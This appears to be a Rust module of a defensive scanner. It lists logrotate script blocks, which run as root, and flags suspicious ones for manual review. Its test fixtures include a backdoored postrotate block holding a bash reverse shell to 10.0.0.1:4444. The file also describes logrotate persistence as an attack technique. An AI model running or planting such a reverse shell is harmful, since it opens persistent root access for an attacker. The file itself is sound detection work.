//! logrotate script blocks.
//!
//! logrotate runs as root on a timer, and its config can carry arbitrary shell
//! in `prerotate`/`postrotate`/`firstaction`/`lastaction` blocks. That makes a
//! tampered logrotate config a scheduled root shell that never shows up in
//! cron.

use std::path::{Path, PathBuf};

use crate::core::scan::{read_text_file, read_text_files, suspicious_matches};
use crate::core::{DefenderContext, Result};

/// The top-level logrotate configuration.
const MAIN_CONFIG: &str = "/etc/logrotate.conf";
/// Per-service logrotate drop-ins.
const CONFIG_DIR: &str = "/etc/logrotate.d";

/// Directives that open a block of shell executed by logrotate.
const SCRIPT_DIRECTIVES: &[&str] = &["prerotate", "postrotate", "firstaction", "lastaction"];

/// A block of shell that logrotate executes as root.
pub struct ScriptBlock {
    /// Config file the block was found in.
    pub file: PathBuf,
    /// Which directive opened it (`postrotate`, `prerotate`, ...).
    pub directive: String,
    /// The shell lines inside the block.
    pub body: Vec<String>,
    /// Why the body looks dangerous; empty if nothing matched.
    pub reasons: Vec<&'static str>,
}

/// Report logrotate script blocks, which run as root on a timer.
pub fn run(ctx: &DefenderContext) -> Result {
    let mut sources: Vec<(PathBuf, String)> = Vec::new();

    if let Some(contents) = read_text_file(Path::new(MAIN_CONFIG)) {
        sources.push((PathBuf::from(MAIN_CONFIG), contents));
    }
    sources.extend(read_text_files(Path::new(CONFIG_DIR)));

    ctx.debug(&format!("Read {} logrotate config(s)", sources.len()));

    let mut blocks = Vec::new();
    for (path, contents) in &sources {
        for (directive, body) in script_blocks(contents) {
            let reasons = suspicious_matches(&body.join("\n"));
            blocks.push(ScriptBlock {
                file: path.clone(),
                directive,
                body,
                reasons,
            });
        }
    }

    if blocks.is_empty() {
        println!("[✓] No logrotate script blocks found");
        return Ok(());
    }

    let flagged = blocks.iter().filter(|b| !b.reasons.is_empty()).count();
    println!(
        "[+] {} logrotate script block(s), {} flagged:",
        blocks.len(),
        flagged
    );

    for block in &blocks {
        println!("    {} — {}", block.file.display(), block.directive);
        for line in &block.body {
            println!("      {}", line);
        }
        if !block.reasons.is_empty() {
            println!("      [!] {}", block.reasons.join(", "));
        }
    }
    println!("[!] logrotate configs are not auto-edited — review each block by hand.");

    Ok(())
}

/// Script blocks as (directive, body lines). A block runs from its directive
/// until the matching `endscript`.
fn script_blocks(contents: &str) -> Vec<(String, Vec<String>)> {
    let mut blocks = Vec::new();
    let mut current: Option<(String, Vec<String>)> = None;

    for line in contents.lines() {
        let trimmed = line.trim();

        if let Some((directive, body)) = current.as_mut() {
            if trimmed == "endscript" {
                blocks.push((directive.clone(), std::mem::take(body)));
                current = None;
            } else if !trimmed.is_empty() {
                body.push(trimmed.to_string());
            }
            continue;
        }

        // A directive may be followed by other tokens on the same line.
        if let Some(directive) = SCRIPT_DIRECTIVES
            .iter()
            .find(|d| trimmed == **d || trimmed.starts_with(&format!("{} ", d)))
        {
            current = Some(((*directive).to_string(), Vec::new()));
        }
    }

    // An unterminated block still carries whatever it accumulated.
    if let Some((directive, body)) = current
        && !body.is_empty()
    {
        blocks.push((directive, body));
    }

    blocks
}

#[cfg(test)]
mod tests {
    use super::*;

    const STOCK: &str = "\
/var/log/syslog {
    rotate 7
    daily
    missingok
    notifempty
    compress
}
";

    const WITH_RESTART: &str = "\
/var/log/nginx/*.log {
    daily
    postrotate
        /usr/sbin/nginx -s reopen
    endscript
}
";

    const BACKDOORED: &str = "\
/var/log/syslog {
    daily
    postrotate
        /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &
    endscript
}
";

    #[test]
    fn a_config_without_scripts_yields_nothing() {
        assert!(script_blocks(STOCK).is_empty());
    }

    #[test]
    fn extracts_a_legitimate_postrotate_block() {
        let blocks = script_blocks(WITH_RESTART);

        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].0, "postrotate");
        assert_eq!(blocks[0].1, vec!["/usr/sbin/nginx -s reopen"]);
        assert!(suspicious_matches(&blocks[0].1.join("\n")).is_empty());
    }

    #[test]
    fn flags_a_backdoored_block() {
        let blocks = script_blocks(BACKDOORED);

        assert_eq!(blocks.len(), 1);
        let reasons = suspicious_matches(&blocks[0].1.join("\n"));
        assert!(reasons.contains(&"bash network redirection (reverse shell)"));
    }

    #[test]
    fn handles_several_blocks_in_one_file() {
        let config = "\
/var/log/a {
    prerotate
        echo before
    endscript
    postrotate
        echo after
    endscript
}
";
        let blocks = script_blocks(config);

        assert_eq!(blocks.len(), 2);
        assert_eq!(blocks[0].0, "prerotate");
        assert_eq!(blocks[1].0, "postrotate");
    }

    #[test]
    fn an_unterminated_block_is_still_reported() {
        let blocks = script_blocks("postrotate\n    /tmp/evil\n");

        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].1, vec!["/tmp/evil"]);
    }
}
